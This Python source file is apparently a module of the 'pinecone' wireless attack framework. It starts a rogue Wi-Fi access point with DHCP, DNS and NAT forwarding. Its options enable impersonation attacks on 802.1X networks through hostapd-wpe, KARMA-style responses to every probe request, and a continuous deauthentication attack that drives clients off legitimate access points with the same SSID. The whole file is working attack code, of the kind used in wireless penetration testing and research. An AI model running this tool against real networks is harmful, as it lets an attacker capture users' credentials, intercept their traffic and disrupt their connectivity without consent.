from ipaddress import ip_network
from subprocess import run
from types import SimpleNamespace

import iptc
from pathlib2 import Path
from pony.orm import *
from pyric import pyw

from pinecone.core.database import ExtendedServiceSet
from pinecone.core.script import BaseScript
from pinecone.utils.template import opts_to_str
from pinecone.core.options import Option, OptionDict


class Module(BaseScript):
    META = {
        "id": "scripts/infrastructure/ap",
        "name": "AP script",
        "author": "Valentín Blanco (https://github.com/valenbg1)",
        "version": "1.0.0",
        "description": "Runs an AP with DNS and DHCP capabilities. Supports impersonation attacks against 802.1X "
                       "networks and also KARMA-style gratuitous probe responses.",
        "options": OptionDict(),
        "depends": {"attack/deauth", "daemon/dnsmasq", "daemon/hostapd-wpe"}
    }
    META["options"].add(Option("INTERFACE", "wlan0", True, "AP mode capable WLAN interface"))
    META["options"].add(Option("CHANNEL", 1, True, "AP channel", int))
    META["options"].add(Option("ENCRYPTION", "WPA2", True, "AP encryption",
                               choices=("OPN", "WEP", "WPA", "WPA/WPA2", "WPA2")))
    META["options"].add(Option("MGT", False, True, "use MGT (802.1X) authn mode instead of PSK (for WPA modes)", bool))
    META["options"].add(Option("PASSWORD", "password12345", False, "AP password (only for WEP or any WPA mode with PSK "
                                                                   "authn)"))
    META["options"].add(Option("SSID", "PINECONEWIFI", True, "AP SSID"))
    META["options"].add(Option("KARMA", False, True, "respond to all directed probe requests (KARMA-style gratuitous "
                                                     "probe responses)", bool))
    META["options"].add(Option("DEAUTH", False, True, "perform a continuous deauth attack to all clients connected to "
                                                      "any access point that announce the same SSID (argument --ssid) "
                                                      "on the same channel (argument --channel) after the rogue AP is "
                                                      "started. Requires these APs to previously be in the recon db "
                                                      "(use the module discovery/recon to populate it), and your WiFi "
                                                      "card to support multiple interfaces. The deauth attack can be "
                                                      "stopped using ctrl-c.", bool))
    META["options"].add(Option("MAC_ACL", description="path to a MAC addresses whitelist. If specified, all the "
                                                      "clients whose MAC address is not in this list will be "
                                                      "rejected."))
    META["options"].add(Option("OUT_IFACE", "eth0", True, "output interface (no-LAN packets will be redirected there)."))
    META["options"].add(Option("ROUTER_IP", "192.168.0.1", "router LAN IP"))
    META["options"].add(Option("NETMASK", "255.255.255.0", "network netmask"))
    META["options"].add(Option("START_ADDR", "192.168.0.50", "DHCP start address"))
    META["options"].add(Option("END_ADDR", "192.168.0.150", "DHCP end address"))
    META["options"].add(Option("LEASE_TIME", "12h", "DHCP lease time"))

    START_SCRIPT_TEMPLATE_PATH = Path(Path(__file__).parent, "start_ap_template").resolve()  # type: Path
    START_SCRIPT_FILENAME = "start_ap_script"

    STOP_SCRIPT_PATH = Path(Path(__file__).parent, "stop_ap_script").resolve()  # type: Path

    def __init__(self):
        super().__init__()

    def run(self, opts, cmd):
        opts_dict = opts
        opts = opts.get_opts_namespace()

        script_args = SimpleNamespace()

        hostapd_wpe_args = OptionDict()
        hostapd_wpe_args.add(opts_dict["INTERFACE"])
        hostapd_wpe_args.add(opts_dict["CHANNEL"])
        hostapd_wpe_args.add(opts_dict["ENCRYPTION"])
        hostapd_wpe_args.add(opts_dict["MGT"])
        hostapd_wpe_args.add(opts_dict["PASSWORD"])
        hostapd_wpe_args.add(opts_dict["SSID"])
        hostapd_wpe_args.add(opts_dict["KARMA"])
        hostapd_wpe_args.add(Option("MAC_ACL", "" if opts.mac_acl is None else opts.mac_acl))

        script_args.hostapd_wpe_args = opts_to_str(hostapd_wpe_args)

        dnsmasq_args = OptionDict()
        dnsmasq_args.add(opts_dict["START_ADDR"])
        dnsmasq_args.add(opts_dict["END_ADDR"])
        dnsmasq_args.add(opts_dict["LEASE_TIME"])

        script_args.dnsmasq_args = opts_to_str(dnsmasq_args)

        script_args.deauth_args_lst = []
        additional_mon_iface = None

        if opts.deauth:
            additional_mon_iface_name = "{}mon".format(opts.interface)
            cmd.pfeedback(
                "[i] Creating additional monitor mode interface {} for the continuous deauth attack...".format(
                    additional_mon_iface_name))
            additional_mon_iface = pyw.devadd(pyw.getcard(opts.interface), additional_mon_iface_name, "monitor")

            with db_session:
                try:
                    for bss in ExtendedServiceSet[opts.ssid].bssets.select(lambda bss: bss.channel == opts.channel):
                        deauth_args = OptionDict()
                        deauth_args.add(Option("INTEFACE", additional_mon_iface_name))
                        deauth_args.add(Option("BSSID", bss.bssid))
                        deauth_args.add(Option("CHANNEL", 0))
                        deauth_args.add(Option("NUM_FRAMES", 0))
                        script_args.deauth_args_lst.append(opts_to_str(deauth_args))
                except:
                    pass

        pyw.ifaddrset(pyw.getcard(opts.interface), opts.router_ip, opts.netmask)

        run(["sysctl", "-w", "net.ipv4.ip_forward=1"])

        cmd.pfeedback(
            "[i] Creating NAT rules in iptables for forwarding {} -> {}...".format(opts.interface, opts.out_iface))
        iptc.Table(iptc.Table.NAT).flush()
        nat_rule = iptc.Rule()
        nat_rule.src = str(ip_network("{}/{}".format(opts.router_ip, opts.netmask), strict=False))
        nat_rule.out_interface = opts.out_iface
        nat_rule.target = nat_rule.create_target("MASQUERADE")
        iptc.Chain(iptc.Table(iptc.Table.NAT), "POSTROUTING").append_rule(nat_rule)

        cmd.pfeedback("[i] Starting hostapd-wpe and dnsmasq...")
        super().run(script_args, cmd)

        if additional_mon_iface:
            cmd.pfeedback("[i] Deleting the additional monitor mode interface created for the continuous deauth "
                          "attack...")
            pyw.devdel(additional_mon_iface)

    def stop(self, cmd):
        cmd.pfeedback("[i] Stopping hostapd-wpe and dnsmasq...")
        super().stop(cmd)

        run(["sysctl", "-w", "net.ipv4.ip_forward=0"])

        cmd.pfeedback("[i] Flushing NAT table in iptables...")
        iptc.Table(iptc.Table.NAT).flush()
